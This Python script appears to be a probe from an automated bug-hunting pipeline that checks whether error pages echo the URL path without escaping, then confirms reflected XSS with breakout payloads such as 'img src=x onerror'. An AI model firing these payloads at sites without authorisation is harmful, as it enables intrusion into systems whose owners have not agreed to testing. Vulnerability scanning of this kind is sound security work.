#!/usr/bin/env python3
"""Generic reflected-XSS probe for PATH/404 sinks on UNKNOWN targets.

Rule #83 (PART 1): the generic sink set covers query (9 classes), form
(4), xml (1), cookie (1), json (1) and header (1) — but zero coverage
for the URL PATH itself. A real human hunter requests a bogus path and
checks whether the 404/error page echoes it unescaped ("page not found:
/<img ...>"). This probe takes the sink spec from its marker argv (the
loop encodes it there so _probe_cmd needs no changes):

    MARKER = PLOOP83|<target_base>|<prefix>|GET

Only GET is accepted (path sinks are read requests; a non-GET marker
fails closed). <prefix> is a known directory prefix (e.g. "/"); the
probe addresses a BOGUS subpath under it so the server answers with its
error page.

Flow (stdlib only):
  1. CONTROL request: GET prefix + "/ploop83ctl<nonce2>" (a DIFFERENT
     bogus path). Its body must NOT contain the canary token — this
     proves the echo is token-specific, not a global string on the
     error page (no self-hit).
  2. REFLECTION TEST: GET prefix + "/GX83R<nonce>P83QZ" (bogus path).
     Raw token in this body but absent from the control body ->
     candidate. HTML-escaped only -> negative control.
  3. CONTEXT CLASSIFICATION (Rule #59/#60 vocabulary): where the raw
     token lands (text/attr-dq/attr-sq/comment/...) -> matching
     breakout payload.
  4. CONFIRMATION: fire the context-specific executable-shaped payload
     (G83P + marker suffix). Raw reflection of the full payload ==
     context breakout == CONFIRMED. The EVIDENCE line mirrors the
     Rule #73 vocabulary:
       sink= method=GET via=<context> payload reflected UNESCAPED

Path segments are percent-encoded when the URL is built
(urllib.parse.quote, safe=""); the initial token is alnum-safe so it
survives any encoding round-trip. A server that echoes the encoded
path without decoding fails the confirm step closed (FAILED, never
CONFIRMED) — no false positive.

One self-contained reproducible command, fixed marker from argv, own
VERDICT line (probe lesson, 29 Oct). Any exception -> PROBE_ERROR +
VERDICT: FAILED (fail-closed).
"""
import html
import os
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

TIMEOUT = 15


def _fetch(url):
    # Path sinks live on ERROR pages: a 404 must return its body, not
    # raise. HTTPError carries the error body — read it like a normal
    # response (fail-closed only on transport errors).
    req = urllib.request.Request(url, headers={"User-Agent": "PLOOP83"})
    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT) as r:
            return r.getcode(), r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def _classify_context(body, token):
    """Same grounded classifier as probe_sink_xss (Rule #59/#60)."""
    idx = body.find(token)
    if idx < 0:
        return None
    before = body[:idx]
    last_open = before.rfind("<!--")
    if last_open != -1 and "-->" not in before[last_open:]:
        return "comment"
    lt = before.rfind("<")
    if lt != -1 and ">" not in before[lt:idx]:
        tag_tail = before[lt:]
        if re.search(r'=\s*"[^"]*$', tag_tail):
            return "attr-dq"
        if re.search(r"=\s*'[^']*$", tag_tail):
            return "attr-sq"
        if re.search(r"=\s*[^\s>\"']*$", tag_tail):
            return "attr-unquoted"
        return "tag-unknown"
    ls = before.lower().rfind("<script")
    if ls != -1 and "</script" not in before[ls:].lower():
        tail = before.rstrip()
        if tail.endswith('"'):
            return "js-dq"
        if tail.endswith("'"):
            return "js-sq"
        return "js-unknown"
    lst = before.lower().rfind("<style")
    if lst != -1 and "</style" not in before[lst:].lower():
        return "style"
    return "text"


def _confirm_payload(context, msuffix, nonce):
    p = "G83P" + nonce + msuffix
    return {
        "text": p + "<img src=x onerror=" + p + ">",
        "attr-dq": p + '" onGX83over="1',
        "attr-sq": p + "' onGX83over='1",
        "attr-unquoted": p + ' onGX83over="1',
        "js-dq": p + '";G83C//',
        "js-sq": p + "';G83C//",
        "comment": p + "-->",
        "style": p + "</style><img src=x onerror=" + p + ">",
    }.get(context)


def main():
    marker = sys.argv[1] if len(sys.argv) > 1 else "PLOOP83"
    try:
        _, tb_q, prefix_q, method = marker.split("|", 3)
    except ValueError:
        print("PROBE_ERROR bad marker spec: %r" % marker)
        print("VERDICT: FAILED")
        return
    tb = urllib.parse.unquote(tb_q)
    prefix = urllib.parse.unquote(prefix_q)
    method = (method or "GET").upper()
    if not tb or not prefix.startswith("/") or method != "GET":
        print("PROBE_ERROR invalid sink spec (path sinks are GET-only, "
              "prefix must start with /)")
        print("VERDICT: FAILED")
        return
    msuffix = re.sub(r"[^A-Za-z0-9]", "", marker.split("|", 1)[0])[:12]
    # Rule #81: run-unique canaries so the executor's reconfirm re-run
    # is an INDEPENDENT confirmation, not a replay of run 1's bytes.
    nonce = os.urandom(3).hex()
    ctl_nonce = os.urandom(3).hex()
    base = tb.rstrip("/") + prefix.rstrip("/")

    # 1. control: a DIFFERENT bogus path — its body must not contain
    #    the canary token (proves the echo is token-specific).
    ctl_seg = "ploop83ctl" + ctl_nonce
    ctl_url = base + "/" + urllib.parse.quote(ctl_seg, safe="")
    try:
        _, ctl_body = _fetch(ctl_url)
    except Exception as e:
        print("PROBE_ERROR control fetch failed: %s" % e)
        print("VERDICT: FAILED")
        return

    # 2. reflection test: bogus path carrying the canary token.
    token = "GX83R%sP83QZ" % nonce
    url = base + "/" + urllib.parse.quote(token, safe="")
    try:
        _, body = _fetch(url)
    except Exception as e:
        print("PROBE_ERROR canary fetch failed: %s" % e)
        print("VERDICT: FAILED")
        return
    if token not in body or token in ctl_body:
        if html.escape(token) in body and token not in ctl_body:
            print("PROBE_NOTE path reflects ESCAPED only (negative "
                  "control)")
        print("VERDICT: FAILED")
        return

    # 3. context classification (Rule #59)
    context = _classify_context(body, token)
    print("EVIDENCE sink=%s method=GET path=%s reflection=RAW "
          "context=%s marker=%s" % (prefix, token, context, msuffix))

    # 4. confirmation with the context-specific breakout payload
    payload = _confirm_payload(context, msuffix, nonce)
    if payload is None:
        print("PROBE_NOTE context %s has no grounded breakout payload "
              "(fail-closed)" % context)
        print("VERDICT: FAILED")
        return
    confirm_url = base + "/" + urllib.parse.quote(payload, safe="")
    try:
        _, body = _fetch(confirm_url)
    except Exception as e:
        print("PROBE_ERROR confirm submit failed: %s" % e)
        print("VERDICT: FAILED")
        return
    if payload in body:
        print("EVIDENCE sink=%s method=GET via=%s payload "
              "reflected UNESCAPED: %s" % (prefix, context, payload))
        print("VERDICT: CONFIRMED")
    else:
        print("PROBE_NOTE confirm payload did not reflect raw "
              "(context=%s)" % context)
        print("VERDICT: FAILED")


if __name__ == "__main__":
    main()
